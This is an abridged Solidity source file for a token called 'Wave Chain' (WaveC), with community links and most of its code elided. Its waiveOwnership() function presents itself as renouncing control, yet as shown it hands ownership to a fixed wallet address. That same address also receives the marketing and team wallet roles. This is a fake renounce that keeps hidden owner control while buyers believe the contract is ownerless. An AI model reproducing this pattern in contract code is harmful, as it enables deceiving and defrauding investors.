...
/**
Telegram : https://t.me/WaveChain
Website  : https://wavechain.online/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb069DF7671aDcc2938BCefc670A67A77562f654e);
    }
...
contract WaveChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Wave Chain";
    string private _symbol = "WaveC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb069DF7671aDcc2938BCefc670A67A77562f654e);
    address payable public teamWalletAddress = payable(0xb069DF7671aDcc2938BCefc670A67A77562f654e);
